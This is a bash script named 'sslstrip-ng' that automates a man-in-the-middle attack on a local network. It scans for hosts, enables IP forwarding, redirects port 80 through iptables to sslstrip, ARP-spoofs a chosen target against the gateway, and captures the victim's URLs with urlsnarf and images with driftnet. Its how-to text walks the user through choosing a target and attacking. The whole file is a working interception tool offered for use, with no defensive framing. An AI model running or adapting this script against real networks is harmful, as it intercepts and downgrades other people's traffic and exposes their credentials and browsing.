#!/bin/bash

# ┌─────────────────────────────────────────────────────────┐
# │    CODED BY : JAYSON CABRILLAS SAN BUENAVENTURA         │
# │    GITHUB   : https://github.com/mkdirlove              │
# │    FACEBOOK : https://web.facebook.com/mkdirlove.git    │
# └─────────────────────────────────────────────────────────┘


# Check if running as root.
function check_sudo() {
  if [[ "$EUID" -ne 0 ]]; then
    clear
    logo
    printf "%b\n" " ERROR!!! This script must be run as root." >&2
    exit 1
  fi
}

# Logo
logo() {              
    clear        
    figlet "           sslstrip-ng"
    echo ""
    echo "      Powered by arp-scan, sslstrip, arpspoof, urlsnarf, & driftnet."
    echo "       ┌─────────────────────────────────────────────────────────┐"
    echo "       │    CODED BY : JAYSON CABRILLAS SAN BUENAVENTURA         │" 
    echo "       │    GITHUB   : https://github.com/mkdirlove              │"
    echo "       │    FACEBOOK : https://web.facebook.com/mkdirlove.git    │"
    echo "       └─────────────────────────────────────────────────────────┘"
    echo ""
    echo ""
}

# Start sniffer
start() {
    logo
    read -p " Enter target IP: " ip
    read -p " Enter gateway: " gtip
    read -p " Enter port (default: 8080): " port
    read -p " Enter interface (default: wlan0): " iface
    echo ""
    sudo echo 1 > /proc/sys/net/ipv4/ip_forward
    sudo iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port $port
    echo ""
    echo " [+] Press CTRL + C to cancel / stop sniffing... "
    read -p $'\033[1;33m [+] Press ENTER to start sniffing...\033[0m'
    arp_attack | sslstrip_attack | urlsnarf_attack | driftnet_attack
    echo ""
}

# Arpspoof
arp_attack() {
    sudo xterm -hold -e arpspoof -i $iface -t $ip  $gtip
}

# Sslstrip
sslstrip_attack() {
    sudo xterm -hold -e sslstrip -l $port
}

# urlsnarf
urlsnarf_attack() {
    sudo xterm -hold -e urlsnarf -i $iface
}

# Driftnet
driftnet_attack() {
    sudo driftnet -i $iface
}

# Scan for targets
scan() {
    logo
    echo ""
    read -p $'\033[1;33m [+] Press ENTER to start scanning.\033[0m'
    sudo xterm -hold -e  arp-scan -l
    main
}

# Stop sniffing
howto() {
    logo
    echo " Install dependencies like..."
    echo "  "
    echo " (figlet, arp-scan, sslstrip, arpspoof, urlsnarf, & driftnet)"
    echo " Connect to a network then scan for targets."
    echo " Get the IP address of you target."
    echo " Get the gateway IP of the network."
    echo " Go back to the tool then ttack."
}

# Main function
main() {
    logo
    echo " [01] Scan targets"
    echo " [02] Start sniffing"
    echo " [03] How to use"
    echo " [00] Exit" 
    echo ""
    echo ""
    echo " ┌─[root@sniffer]─[~]"
    read -p " └──╼ # " act

    if [[ $act == "01" || $act == "1" ]]; then
    scan
    elif [[ $act == "02" || $act == "2" ]]; then
    start
    elif [[ $act == "03" || $act == "3" ]]; then
    howto
    elif [[ $act == "00" || $act == "0" ]]; then
    logo
    sleep 3
    clear
    exit
    fi
}

# Argument start here
check_sudo
main
